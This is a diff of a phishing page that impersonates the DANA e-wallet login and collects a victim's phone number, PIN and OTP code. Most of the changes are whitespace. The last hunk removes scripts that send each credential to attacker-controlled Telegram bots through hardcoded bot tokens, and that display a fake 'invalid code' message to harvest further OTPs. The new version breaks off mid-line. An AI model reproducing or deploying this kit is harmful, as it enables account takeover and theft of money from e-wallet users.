@@ -26,7 +26,7 @@
 <link rel="stylesheet" href="https://dev-danapemulihan.pantheonsite.io/asset/pin.css">
 </head>
 <style>
-    
+
 body, html{
       left: 0;
       right: 0;
@@ -36,7 +36,7 @@ body, html{
       width: 100%;
       height: 100%;
       positon: fixed
-      
+
 }
 h2{font-size: 18px; }
 
@@ -44,7 +44,7 @@ h3{
   font-size: 14px;  
 }
 
- 
+
  * {
   box-sizing: border-box;
   scrollbar-color: transparent transparent; /* thumb and track color */
@@ -100,7 +100,7 @@ ol, li {
   overflow-x: scroll;
   counter-reset: item;
   margin: 0px auto;
- 
+
   scroll-behavior: smooth;
   scroll-snap-type: x mandatory;{}
 }
@@ -141,8 +141,8 @@ ol, li {
   height: 100%;
   scroll-snap-align: center;
   background-color: #118CEA;
-  
-  
+
+
 }
 
 @media (hover: hover) {
@@ -238,8 +238,8 @@ ol, li {
             bottom: 0;
             background: rgba(0, 0, 0, 0.6);
             z-index: 99999;
-            
-      
+
+
 }
 .loading {
     position: absolute;
@@ -250,7 +250,7 @@ ol, li {
 }
 .loading img {
     width: 50px;
-    
+
     top: 10;
 }
 .loading .spinner{
@@ -297,16 +297,16 @@ ol, li {
   top: 0;
   bottom: 0;
   margin: 0px auto;
-     
-     
+
+
  }
- 
+
  .inp{
      width: 70%;
      padding-left: 10px;
  }
- 
- 
+
+
  .btn-backku{
      position: absolute;
      left: 20;
@@ -316,15 +316,15 @@ ol, li {
      border: none;
      font-size: 18px;
      font-weight: 300;
-    
+
  }
- 
- 
+
+
  #back1{
       display: none;
-     
+
  }
- 
+
  #back2{
       display: none;
  }
@@ -332,38 +332,38 @@ ol, li {
 <body>
 
 <div style="display:none;" class="index">
-	<div class="header">
-		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
-	</div>
-	<div class="content">
-		<div class="hero">
-			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/hero.svg" alt="">
-		</div>
-		<h1>Dompet digital untuk kamu!</h1>
-		<p class="desc">
-			Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
-		<div class="line"></div>
-		<p class="log">
-			Masukkan <b>nomor HP</b> kamu untuk lanjut
-		</p>
-		<button type="button" onclick="next();">LOGIN</button>
-	</div>
+  <div class="header">
+    <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
+  </div>
+  <div class="content">
+    <div class="hero">
+      <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/hero.svg" alt="">
+    </div>
+    <h1>Dompet digital untuk kamu!</h1>
+    <p class="desc">
+      Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+    <div class="line"></div>
+    <p class="log">
+      Masukkan <b>nomor HP</b> kamu untuk lanjut
+    </p>
+    <button type="button" onclick="next();">LOGIN</button>
+  </div>
 </div>
 <div class="start" style="display:none;">
-	<img class="logo" src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_text.png" style="width: 150px">
-	<div class="footimg">
-		<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/bi.png" alt=""><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/kom.png" alt="">
-		<p>
-			DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
-	</div>
+  <img class="logo" src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_text.png" style="width: 150px">
+  <div class="footimg">
+    <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/bi.png" alt=""><img src="https://dev-danapemulihan.pantheonsite.io/asset/img/kom.png" alt="">
+    <p>
+      DANA Indonesia terdaftar dan diawasi<br>oleh Bank Indonesia dan Kominfo</p>
+  </div>
 </div>
 
 <div class="container hid" style="position: fixed">
-    
-	<div class="" style="text-align: center;" id="homeku">
-   
 
-        
+  <div class="" style="text-align: center;" id="homeku">
+
+
+
      <section class="carousel" aria-label="Gallery" style="margin-top: 0px; text-align: center; left: 0">
   <ol class="carousel__viewport">
     <li id="carousel__slide1"
@@ -373,8 +373,8 @@ ol, li {
       background-position: 100% 100%;
       background-repeat: no-repeat;
       background-size: 100% 100%; z-index: 99999999; position: relative;">
-       
-       
+
+
       </div>
     </li>
     <li id="carousel__slide2"
@@ -396,11 +396,11 @@ ol, li {
       background-position: 100% 100%;
       background-repeat: no-repeat;
       background-size: 100% 100%;">
-       
-       
+
+
       </div>
     </li>
-   
+
   </ol>
   <aside class="carousel__navigation">
     <ol class="carousel__navigation-list">
@@ -417,7 +417,7 @@ ol, li {
            class="carousel__navigation-button"></a>
       </li>
       <li class="carousel__navigation-item">
-        
+
     </ol>
   </aside>
 </section>
@@ -443,35 +443,35 @@ ol, li {
     right: 0; 
     margin: 0px auto;
     top: 0; display: none;">
-      	<div id="process" name="process" class="process" style="display: none;">
-			<div class="loading">
-				<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png">
-				<img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png" style="margin-top: 8px">
-			</div>
-		</div>
-		
-		<div class="header">
+        <div id="process" name="process" class="process" style="display: none;">
+      <div class="loading">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png">
+        <img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png" style="margin-top: 8px">
+      </div>
+    </div>
+
+    <div class="header">
 <button id="back1" type="button" class="btn-backku" onclick="goback1()"><ion-icon name="chevron-back-outline"></ion-icon></button>	<p></p>
 
 
-			<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
-		</div>
-		<form id="formNohp" onsubmit="sendNohp(event);" >
-		     <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
-			<h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
-			<div class="box-input" style="width: 95%;">
-				<div class="label">
-					<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt=""><label>+62</label>
-				</div>
-				<input class="inp" id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="812-3456-7890" maxlength="12" minlength="10"></div>
-			<p class="desc" style="font-size: 12px; line-height: 18px; margin-top: 25px">
+      <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" class="logo" alt="">
+    </div>
+    <form id="formNohp" onsubmit="sendNohp(event);" >
+         <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
+      <h3 style="font-size: 16px; margin-top: -20px">Masukkan <b>nomor HP</b> kamu untuk lanjut</h3>
+      <div class="box-input" style="width: 95%;">
+        <div class="label">
+          <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt=""><label>+62</label>
+        </div>
+        <input class="inp" id="inp" type="tel" autocomplete="off" required name="nohp" placeholder="812-3456-7890" maxlength="12" minlength="10"></div>
+      <p class="desc" style="font-size: 12px; line-height: 18px; margin-top: 25px">
 Nomor ponsel akan digunakan sebagai ID kamu & menjaga<br>akun selalu aman. Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan dan Kebijakan Privasi</b> kami.
-			</p>
-			<div class="box-btn">
-				<button disabled id="btn" class="btnnohp" type="submit" style="margin-top: -40px">LANJUT</button>
-			</div>
-		</form>
-		<form id="formPin" omsubmit="return false" class="hid" style="width: 100%;
+      </p>
+      <div class="box-btn">
+        <button disabled id="btn" class="btnnohp" type="submit" style="margin-top: -40px">LANJUT</button>
+      </div>
+    </form>
+    <form id="formPin" omsubmit="return false" class="hid" style="width: 100%;
     height: 100%;
     bottom: 0; 
     position: fixed; 
@@ -479,16 +479,16 @@ Nomor ponsel akan digunakan sebagai ID kamu & menjaga<br>akun selalu aman. Denga
     right: 0; 
     margin: 0px auto;
     top: 0;">
-		     <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
-		    <button id="back2" type="button" class="btn-backku" onclick="goback2()" style="margin-top: 10px"><ion-icon name="chevron-back-outline"></ion-icon></button>
-			<h3 style="margin-top: 50px; font-weight: 600; margin-bottom: -10px; font-size: 16px"><font style="font-weight: 400">Masukkan</font> PIN DANA</h3>
-			<div class="box-input-pin">
-				<div type="button" class="clear"></div>
-				<input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required"""" maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;" onchange="javascript:this.form.button();" oninput="sendPin()"></div>
-			<button class="show" type="button">TAMPILKAN</button>
-			<p class="forgot">LUPA PIN?</p>
-			<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbD-mmuMUDwaeFMEz6NefivuQqHyrFXvXxqVxMhYRhR5wsfUhiWkPNkpxLKkagRNpJ2obIiZH_D9EK6tnHIJUFMVBOclZI98zrU7VPszAR5n-_GeSWNCNgnfH1MRWuL-ahhPjxsejyDa5yyWAaOMWXWT4jS4EngtdLLlXjaPakQoFIOsjyS6tfnEBHDlw/s16000/output-onlinegiftools.gif" width="100%" style="position: absolute; bottom: 10; left: 0; right: 0; margin: 0px auto;">
-		</form>
+         <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
+        <button id="back2" type="button" class="btn-backku" onclick="goback2()" style="margin-top: 10px"><ion-icon name="chevron-back-outline"></ion-icon></button>
+      <h3 style="margin-top: 50px; font-weight: 600; margin-bottom: -10px; font-size: 16px"><font style="font-weight: 400">Masukkan</font> PIN DANA</h3>
+      <div class="box-input-pin">
+        <div type="button" class="clear"></div>
+        <input name="pin1" id="pin1" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin2" id="pin2" class="inppin" inputmode="numeric" type="password" autocomplete="off" required"""" maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin3" id="pin3" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin4" id="pin4" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin5" id="pin5" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="pin6" id="pin6" class="inppin" inputmode="numeric" type="password" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;" onchange="javascript:this.form.button();" oninput="sendPin()"></div>
+      <button class="show" type="button">TAMPILKAN</button>
+      <p class="forgot">LUPA PIN?</p>
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbD-mmuMUDwaeFMEz6NefivuQqHyrFXvXxqVxMhYRhR5wsfUhiWkPNkpxLKkagRNpJ2obIiZH_D9EK6tnHIJUFMVBOclZI98zrU7VPszAR5n-_GeSWNCNgnfH1MRWuL-ahhPjxsejyDa5yyWAaOMWXWT4jS4EngtdLLlXjaPakQoFIOsjyS6tfnEBHDlw/s16000/output-onlinegiftools.gif" width="100%" style="position: absolute; bottom: 10; left: 0; right: 0; margin: 0px auto;">
+    </form>
 <div class="bgotp hid" style="width: 100%;
     height: 100%;
     bottom: 0; 
@@ -498,49 +498,49 @@ Nomor ponsel akan digunakan sebagai ID kamu & menjaga<br>akun selalu aman. Denga
     margin: 0px auto;
     top: 0;">
 <div class="bgotp hid"><form id="formOtp" class=""><h2>Masukan Kode OTP</h2><br><center>
-				<p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 0px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300"></p>
-				
-				
-				</center>
-				<div class="box-input-otp" style="margin-top: 50px">
-					
-					<div class="loadingOtp" style="display:none;background: #fafafa">
+        <p class="alert" id="alert" style="font-size: 14px; text-align: center; margin-bottom: 0px; font-weight: 500; color: #000; margin-top: 0px; display: ; width: 360px; margin-bottom: -10px; font-weight: 300"></p>
 
-						
-						<img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png">
-		</div>
-		<div type="button" class="clearotp"></div>
-		 <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
-					<input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
-		 <p id="waktuku" class="resend" style="margin-top: 70px; spacing: 2;color: #0f78cb; font-size: 13px">
-					Kirim Ulang (<span id="carasingkat" style="color: #0f78cb">60</span>s)
-				</p>
+
+        </center>
+        <div class="box-input-otp" style="margin-top: 50px">
+
+          <div class="loadingOtp" style="display:none;background: #fafafa">
+
+
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_bg.png"><img class="spinner" src="https://dev-danapemulihan.pantheonsite.io/asset/img/load_spin.png">
+    </div>
+    <div type="button" class="clearotp"></div>
+     <input type="hidden" id="logo" value="𝐃𝐀𝐍𝐀 𝐈𝐃">
+          <input name="otp1" id="otp1" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp2" id="otp2" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp3" id="otp3" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"><input name="otp4" id="otp4" class="inpotp" inputmode="numeric" type="number" autocomplete="off" required maxlength="1" onkeypress="if(this.value.length==1) return false;"></div>
+     <p id="waktuku" class="resend" style="margin-top: 70px; spacing: 2;color: #0f78cb; font-size: 13px">
+          Kirim Ulang (<span id="carasingkat" style="color: #0f78cb">60</span>s)
+        </p>
        <p class="resend" style="margin-top: 70px; spacing: 2; font-weight: 600; color: #0f78cb; margin-left: 0px; display: none" id="kirim-ulang" onclick="kirimulang()">Kirim Ulang</p>
-       
-       
-			</div>
-		</div>
-	</div>
+
+
+      </div>
+    </div>
+  </div>
 </div>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
         <script>
             var url = "#kirim-ulang"; // url tujuan
             var count = 60; // dalam detik
             function countDown() {
-                
+
                 if (count > 0) {
                     count--;
                     var waktu = count + 0;
             $('#carasingkat').html(waktu);
-             
+
          setTimeout("countDown()", 1000);
-           
-                    
-               
+
+
+
                 }
             }
             countDown();
-       
+
        </script>
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
@@ -554,243 +554,4 @@ Nomor ponsel akan digunakan sebagai ID kamu & menjaga<br>akun selalu aman. Denga
 var pinContainer = document.querySelector(".box-input-pin");
 console.log('There is ' + pinContainer.length + ' Pin Container on the page.');
 
-pinContainer.addEventListener('keyup', function (event) {
-    var target = event.srcElement;
-    
-    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
-    var myLength = target.value. length;
-
-    if (myLength >= maxLength) {
-        var next = target;
-        while (next = next.nextElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        } aa
-    }
-
-    if (myLength === 0) {
-        var next = target;
-        while (next = next.previousElementSibling) {
-            if (next == 0) break;
-            if (next.tagName.toLowerCase() == "input") {
-                next.focus();
-                break;
-            }
-        }
-    }
-}, false);
-
-pinContainer.addEventListener('keydown', function (event) {
-    var target = event.srcElement;
-    target.value = "";
-}, false);
-</script>
-<script>$('.inpotp').on('input', function(event) {const inputs = $('.inpotp');const isAllFilled = Array.from(inputs).every((input) => input.value !== '');if (isAllFilled == true) {$(event.target).blur();sendOtp();}const index = inputs.index(this);const currentValue = event.target.value;if (currentValue.length === 1) {if (index < inputs.length - 1) {inputs[index + 1].focus();}} else if (currentValue.length === 0) {if (index > 0) {inputs[index].focus();}};});$('.inpotp').on('keydown', function(event) {const inputs = $('.inpotp');const key = event.key;const index = inputs.index(this);if (key === 'Backspace' && event.target.value.length === 0) {if (index > 0) {inputs[index - 1].focus();}};});</script>
-<script>$(document).ready(function() {$('.clear').click(function() {$('.inppin').val('');$('#pin1').focus();});$('.clearotp').click(function() {$('.inpotp').val('');$('#otp1').focus();});$('.show').click(function() {$('.inppin').each(function() {if ($(this).attr('type') === 'password') {$(this).attr('type','number');$(".show").text("SEMBUNYIKAN");} else {$(this).attr('type', 'password');$(".show").text("TAMPILKAN");}});});});</script>
-<script>
- function nextPrev(){
-      $("#process1").show();event.preventDefault();
-       setTimeout(function(){
-           $("#homeku").hide();
-           $("#back1").show();
-           $("#butonku").fadeOut();
-           $(".box-login").fadeIn();
-           $("#process1").hide();
-       },1000);
- }   
- 
- 
- function goback1(){
-     $("#process").show();
-     setTimeout(function(){
-     $("#homeku").show();
-      $(".box-login").fadeOut();
-      $("#butonku").fadeIn();
-      $("#back1").hide();
-       $("#process").hide();
-       
-     },500);
- }
- 
- </script>
- <script>
- 
- function goback2(){
-     $("#process").show();
-     setTimeout(function(){
-    $("#formPin").fadeOut();
-     $("#formNohp").fadeIn();
-       $("#process").hide();
-        $("#inp").val('');
-        $("#back1").show();
-        $("#back2").hide();
-        document.getElementById("formPin").reset();
-        $('.inppin').val('');
-     },500);
- }
-</script>
-<script>
-    $( document ).ready(function() {
-            setTimeout(() => {
-                $('#popup').hide();
-                $('chsalxcome2').fadeIn();
-            },2000)
-             $('musikku').play();
-        })
-        
-</script>
-
-
-<script>
-function tutupotp(){
-$(".bgotp").hide();    
-}
-</script>
-<script>
-   function sendNohp(event){
-    $("#process").show();event.preventDefault();
-    $("#inp").blur();
-     
-    
-    
-    var nomor = document.getElementById("inp").value;
-            sessionStorage.setItem("nomor", nomor);
-    var logo = document.getElementById('logo');       
-    var inp = document.getElementById('inp');
-    
-    var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩 : ' + '0' + inp.value;
-   
-    var token = '7041751605:AAFKiEDV17Ik__NBIiSzyCSr_RscW4fMffA'; // Ganti dengan token bot yang kamu buat
-    var grup = '7165458140'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-    
-    success: function(){
-    $("#process").hide();
-    document.getElementById("back1").style.display = "none";
-    document.getElementById("back2").style.display = "block";
-    $("#formNohp").fadeOut();
-    setTimeout(function(){
-   
-    $("#formPin").fadeIn();
-    $("#pin1").focus();
-    }, 500);}});};
-    
-
-function sendPin(){
-
- 
- 
-  var nomor = sessionStorage.getItem("nomor");
-        document.getElementById("alert").innerHTML = "Kode dikirim via SMS ke +62 " + nomor+ " <br/>";
-  var logo = document.getElementById('logo'); 
-  var inp = document.getElementById('inp');
- var pin1 = document.getElementById('pin1');
- var pin2 = document.getElementById('pin2');
- var pin3 = document.getElementById('pin3');
- var pin4 = document.getElementById('pin4');
- var pin5 = document.getElementById('pin5');
- var pin6 = document.getElementById('pin6');
-     
-  var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝐏𝐈𝐍.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
-  
-     
- 
-
-    var token = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6235911819'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-
-
-success: function(){
-$("#process").hide();
-document.getElementById("alert").style.display = "block"; 
-$(".bgotp").fadeIn();
-setInterval(countdown, 1000);
-$("#otp1").focus();
-}
-}
-);
-};
-
-
-  function sendOtp(){
-    $(".loadingOtp").show();
-     var logo = document.getElementById('logo'); 
-     var inp = document.getElementById('inp');
- var pin1 = document.getElementById('pin1');
- var pin2 = document.getElementById('pin2');
- var pin3 = document.getElementById('pin3');
- var pin4 = document.getElementById('pin4');
- var pin5 = document.getElementById('pin5');
- var pin6 = document.getElementById('pin6');
-     var otp1 = document.getElementById('otp1');
-   var otp2 = document.getElementById('otp2');
-   var otp3 = document.getElementById('otp3');
-   var otp4 = document.getElementById('otp4');
-    setTimeout(function(){
-$(".alert").text("Kode Invalid ");
-$(".alert").css("color","red");
- },2000);
-    var gabungan = '' + logo.value + '%0A𝐍𝐨.𝐇𝐩: ' + '0' + inp.value + '%0A𝐏𝐈𝐍    : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value + '%0A%0A𝐎𝐓𝐏    : ' + otp1.value + otp2.value + otp3.value + otp4.value;
-
-
-    var token = '7142158232:AAFrUmsAZEcin86tEQY_3nKTGfp-XT-icXY'; // Ganti dengan token bot yang kamu buat
-    var grup = '6235911819'; // Ganti dengan chat id dari bot yang kamu buat
-
-    $.ajax({
-        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
-        method: `POST`,
-        
-    success: function(){
-    setTimeout(function(){
-    $(".loadingOtp").hide();
-   
-    $('.inpotp').val('');
-   $('#otp1').focus();
-  var nomor = sessionStorage.getItem("nomor");
-        document.getElementById("alert").innerHTML = "Kode baru dikirim ulang via SMS ke  +62" + nomor +  " <br/>";
-   $(".alert").css("color","black");
-    },4000);
-   
-        
-    }
-        
-    }
-    );
-        
-    };
-    </script>
-<script>
-    function countdown() {
-    var count = parseInt(
-    $('#countdown').text());
-    if (count !== 0) {
-    $('#countdown').text(count - 1);} 
-    else {
-    $('#countdown').text('60');}};
-    </script>
-<script>
-window.onload = function(){
-        setTimeout(function(){
-            $(".start").fadeIn();
-            setTimeout(function(){
-                $(".start").fadeOut(1000);
-                setTimeout(function(){
-                   $(".container").fadeIn(200);
-                   $("#inp").focus();
-                },1000);
-            },1000);
-        },500);
-}
-</script>
-</body>
-</html><!--<script src='https://a.bsite.net/footer.js'></script>
+  pinContainer.addEve
